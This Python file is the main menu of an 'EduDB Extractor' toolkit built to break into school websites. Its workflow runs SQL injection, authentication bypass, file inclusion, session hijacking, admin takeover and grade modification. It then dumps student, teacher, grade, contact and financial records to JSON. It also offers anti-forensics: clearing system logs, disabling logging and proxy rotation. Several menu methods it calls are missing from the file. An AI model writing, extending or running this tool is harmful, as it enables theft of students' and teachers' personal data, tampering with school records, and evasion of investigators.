#!/usr/bin/env python3
# main.py - EduDB Extractor Main Menu
import os
import sys
import time
from recon.school_scanner import SchoolScanner
from exploit.sql_injector import SQLInjector
from exploit.auth_bypass import AuthBypass
from exploit.lfi_scanner import LFIScanner
from extract.db_dumper import DBDumper
from analyze.data_visualizer import DataVisualizer
from stealth.proxy_rotator import ProxyRotator
from stealth.log_cleaner import LogCleaner

class EduDBExtractor:
    def __init__(self):
        self.proxy_rotator = ProxyRotator()
        self.scanner = SchoolScanner(self.proxy_rotator)
        self.injector = SQLInjector(self.proxy_rotator)
        self.auth_bypass = AuthBypass(self.proxy_rotator)
        self.lfi_scanner = LFIScanner(self.proxy_rotator)
        self.dumper = DBDumper(self.proxy_rotator)
        self.visualizer = DataVisualizer()
        self.log_cleaner = LogCleaner()
        self.target_url = ""
        self.session_data = {}
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """
        ╔══════════════════════════════════════════════╗
        ║        EDUDB EXTRACTOR TOOLKIT v2.0          ║
        ║     School Database Dumping System           ║
        ║                                              ║
        ║  [🔥] Target: School Management Systems      ║
        ║  [📊] Data: Students, Teachers, Grades       ║
        ║  [🎯] Method: Multi-Vector Extraction        ║
        ╚══════════════════════════════════════════════╝
        """
        print(banner)
    
    def main_menu(self):
        while True:
            self.clear_screen()
            self.print_banner()
            
            if self.target_url:
                print(f"\n[🎯] Current Target: {self.target_url}")
            
            print("\n" + "="*50)
            print("MAIN MENU")
            print("="*50)
            print("1. 🎯 Set Target Website")
            print("2. 🔍 Reconnaissance & Scanning")
            print("3. 🗡️ Exploit & Vulnerability Testing")
            print("4. 🗄️ Database Extraction")
            print("5. 📊 Data Analysis & Visualization")
            print("6. 🛡️ Stealth & Anti-Forensics")
            print("7. 📁 View Extracted Data")
            print("8. 🚪 Exit")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.set_target()
            elif choice == '2':
                self.recon_menu()
            elif choice == '3':
                self.exploit_menu()
            elif choice == '4':
                self.extract_menu()
            elif choice == '5':
                self.analyze_menu()
            elif choice == '6':
                self.stealth_menu()
            elif choice == '7':
                self.view_data()
            elif choice == '8':
                print("\n[!] Cleaning up...")
                self.log_cleaner.clean_temporary_files()
                time.sleep(1)
                sys.exit(0)
            else:
                print("\n[!] Invalid option!")
                time.sleep(1)
    
    def set_target(self):
        print("\n" + "="*50)
        print("TARGET CONFIGURATION")
        print("="*50)
        
        url = input("Enter target school website URL (e.g., http://school.edu): ").strip()
        if not url.startswith('http'):
            url = 'http://' + url
        
        self.target_url = url
        self.session_data['target_url'] = url
        
        print(f"\n[+] Testing connection to {url}...")
        if self.scanner.test_connection(url):
            print("[✓] Connection successful")
            
            cms = self.scanner.detect_cms(url)
            if cms:
                print(f"[✓] Detected CMS: {cms}")
                self.session_data['cms'] = cms
            
            info = self.scanner.get_school_info(url)
            if info:
                print(f"[✓] School identified: {info.get('name', 'Unknown')}")
                self.session_data.update(info)
        else:
            print("[!] Connection failed")
        
        input("\nPress Enter to continue...")
    
    def recon_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("RECONNAISSANCE MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 🔍 Full School System Scan")
            print("2. 📋 Enumerate School Pages")
            print("3. 🏫 Identify Student Portal")
            print("4. 👨‍🏫 Find Teacher/Admin Areas")
            print("5. 💾 Check Database Exposure")
            print("6. 🔐 Test Default Credentials")
            print("7. 📊 Generate Recon Report")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.full_scan()
            elif choice == '2':
                self.enumerate_pages()
            elif choice == '3':
                self.find_student_portal()
            elif choice == '4':
                self.find_admin_areas()
            elif choice == '5':
                self.check_db_exposure()
            elif choice == '6':
                self.test_default_creds()
            elif choice == '7':
                self.generate_recon_report()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def exploit_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("EXPLOIT MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 💉 SQL Injection Testing")
            print("2. 🚪 Authentication Bypass")
            print("3. 📁 Local File Inclusion (LFI)")
            print("4. 🔓 Session Hijacking")
            print("5. 🎯 Targeted Student Data Access")
            print("6. 👨‍💼 Teacher/Admin Account Takeover")
            print("7. 📝 Grade Modification Testing")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.sql_injection_test()
            elif choice == '2':
                self.auth_bypass_test()
            elif choice == '3':
                self.lfi_test()
            elif choice == '4':
                self.session_hijack_test()
            elif choice == '5':
                self.target_student_data()
            elif choice == '6':
                self.admin_takeover_test()
            elif choice == '7':
                self.grade_mod_test()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def extract_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("DATABASE EXTRACTION MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 🗄️ Dump Complete Database")
            print("2. 👨‍🎓 Extract Student Records")
            print("3. 👨‍🏫 Extract Teacher Records")
            print("4. 📊 Extract Grade Data")
            print("5. 🏠 Extract Address & Contact Info")
            print("6. 📅 Extract Attendance Records")
            print("7. 💰 Extract Financial Data (if any)")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.dump_complete_db()
            elif choice == '2':
                self.extract_student_data()
            elif choice == '3':
                self.extract_teacher_data()
            elif choice == '4':
                self.extract_grade_data()
            elif choice == '5':
                self.extract_contact_data()
            elif choice == '6':
                self.extract_attendance_data()
            elif choice == '7':
                self.extract_financial_data()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def analyze_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("DATA ANALYSIS & VISUALIZATION")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 📈 Student Distribution Chart")
            print("2. 🎯 Grade Analysis Visualization")
            print("3. 🕸️ Relationship Network Graph")
            print("4. 📅 Event Timeline Chart")
            print("5. 📊 Generate Comprehensive Dashboard")
            print("6. 📋 Data Statistics Summary")
            print("7. 🎨 Custom Visualization")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.student_distribution_chart()
            elif choice == '2':
                self.grade_analysis_visualization()
            elif choice == '3':
                self.relationship_network_graph()
            elif choice == '4':
                self.event_timeline_chart()
            elif choice == '5':
                self.generate_comprehensive_dashboard()
            elif choice == '6':
                self.data_statistics_summary()
            elif choice == '7':
                self.custom_visualization()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def stealth_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("STEALTH & ANTI-FORENSICS")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 🛡️ Enable Proxy Rotation")
            print("2. 🗑️ Clear System Logs")
            print("3. 🔒 Encrypt Sensitive Files")
            print("4. 🕵️‍♂️ Anti-Forensics Measures")
            print("5. 🌐 Spoof Requests")
            print("6. 📝 Clean Temporary Files")
            print("7. 🚫 Disable Logging Temporarily")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.enable_proxy_rotation()
            elif choice == '2':
                self.clear_system_logs()
            elif choice == '3':
                self.encrypt_sensitive_files()
            elif choice == '4':
                self.anti_forensics_measures()
            elif choice == '5':
                self.spoof_requests()
            elif choice == '6':
                self.clean_temporary_files()
            elif choice == '7':
                self.disable_logging_temporarily()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    # Implementasi metode-metode (disingkat untuk hemat space)
    def full_scan(self):
        print("\n[+] Starting full reconnaissance scan...")
        results = self.scanner.comprehensive_scan(self.target_url)
        self.session_data['scan_results'] = results
        print(f"[✓] Scan completed. Found {len(results.get('pages', []))} pages")
        input("\nPress Enter to continue...")
    
    def sql_injection_test(self):
        print("\n[+] Testing for SQL Injection vulnerabilities...")
        test_params = ['student_id', 'nis', 'nisn', 'id_siswa']
        vulnerable = []
        for param in test_params:
            is_vuln = self.injector.test_parameter(self.target_url, param)
            if is_vuln:
                vulnerable.append(param)
                print(f"  [✓] VULNERABLE: {param}")
        
        if vulnerable:
            print(f"\n[!] Found {len(vulnerable)} vulnerable parameters!")
            self.session_data['sql_injection'] = vulnerable
            exploit = input("\nExploit vulnerable parameters? (y/n): ").lower()
            if exploit == 'y':
                self.exploit_sql_injection(vulnerable)
        else:
            print("\n[✓] No SQL injection vulnerabilities found")
        
        input("\nPress Enter to continue...")
    
    def dump_complete_db(self):
        print("\n[⚠️] WARNING: This will extract ALL database data")
        confirm = input("Are you sure? This may take a long time (y/n): ").lower()
        
        if confirm != 'y':
            return
        
        print("\n[+] Starting complete database dump...")
        
        if 'sql_injection' not in self.session_data:
            print("[!] No SQL injection points found. Run exploitation first.")
            input("\nPress Enter to continue...")
            return
        
        vuln_param = self.session_data['sql_injection'][0]
        
        print("[+] Enumerating all tables...")
        tables = self.injector.get_tables(self.target_url, vuln_param)
        
        if not tables:
            print("[!] Could not enumerate tables")
            return
        
        print(f"[+] Found {len(tables)} tables")
        
        school_tables = []
        for table in tables:
            table_lower = table.lower()
            if any(keyword in table_lower for keyword in ['siswa', 'student', 'guru', 'teacher', 'nilai', 'grade']):
                school_tables.append(table)
        
        print(f"[🎯] Identified {len(school_tables)} school-related tables")
        
        all_data = {}
        for i, table in enumerate(school_tables, 1):
            print(f"\n[{i}/{len(school_tables)}] Dumping: {table}")
            
            try:
                data = self.injector.dump_table(self.target_url, vuln_param, table)
                if data:
                    all_data[table] = data
                    print(f"    Extracted {len(data)} rows")
                    
                    import json
                    filename = f"dump_{table}.json"
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(data, f, indent=2, ensure_ascii=False)
                    print(f"    Saved to: {filename}")
                    
                    time.sleep(0.5)
            except Exception as e:
                print(f"    Error: {e}")
        
        self.session_data['complete_dump'] = all_data
        print(f"\n[✓] Complete dump finished. Extracted {len(all_data)} tables.")
        
        self.generate_data_report(all_data)
        
        input("\nPress Enter to continue...")
    
    def generate_data_report(self, data):
        print("\n[+] Generating data analysis report...")
        
        total_records = sum(len(table_data) for table_data in data.values())
        
        print(f"\n📊 DATA ANALYSIS REPORT")
        print("="*40)
        print(f"Total tables extracted: {len(data)}")
        print(f"Total records: {total_records}")
        print("="*40)
        
        report = {
            'extraction_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'target_url': self.target_url,
            'tables_extracted': len(data),
            'total_records': total_records,
            'table_summary': {name: len(records) for name, records in data.items()}
        }
        
        import json
        with open('extraction_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[✓] Report saved to: extraction_report.json")
    
    def student_distribution_chart(self):
        if 'complete_dump' not in self.session_data:
            print("[!] No data extracted yet. Run database extraction first.")
            input("\nPress Enter to continue...")
            return
        
        print("\n[+] Generating student distribution chart...")
        student_data = self.dumper.organize_student_data(self.session_data['complete_dump'])
        
        if student_data:
            chart_file = self.visualizer.plot_student_distribution(student_data)
            if chart_file:
                print(f"[✓] Chart saved: {chart_file}")
        else:
            print("[!] No student data found")
        
        input("\nPress Enter to continue...")
    
    def enable_proxy_rotation(self):
        print("\n[+] Enabling proxy rotation...")
        self.proxy_rotator.validate_proxies()
        stats = self.proxy_rotator.get_stats()
        print(f"[✓] Proxy rotation enabled. Working proxies: {stats['working']}/{stats['total']}")
        input("\nPress Enter to continue...")
    
    def clear_system_logs(self):
        print("\n[⚠️] WARNING: This will clear system logs")
        confirm = input("Are you sure? (y/n): ").lower()
        
        if confirm == 'y':
            print("\n[+] Clearing system logs...")
            results = self.log_cleaner.clean_system_logs()
            cleared_count = sum(len(r.get('files_cleared', [])) for r in results)
            print(f"[✓] Cleared {cleared_count} log files")
        else:
            print("[!] Operation cancelled")
        
        input("\nPress Enter to continue...")
    
    def view_data(self):
        if 'complete_dump' not in self.session_data:
            print("[!] No data extracted yet")
            input("\nPress Enter to continue...")
            return
        
        print("\n" + "="*50)
        print("EXTRACTED DATA VIEWER")
        print("="*50)
        
        data = self.session_data['complete_dump']
        print(f"Total tables: {len(data)}")
        
        for table_name, table_data in data.items():
            print(f"\n📁 {table_name} ({len(table_data)} records):")
            if table_data:
                for i, row in enumerate(table_data[:3]):  # Show first 3 rows
                    print(f"  Row {i+1}: {str(row)[:100]}...")
                if len(table_data) > 3:
                    print(f"  ... and {len(table_data) - 3} more rows")
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        tool = EduDBExtractor()
        tool.main_menu()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
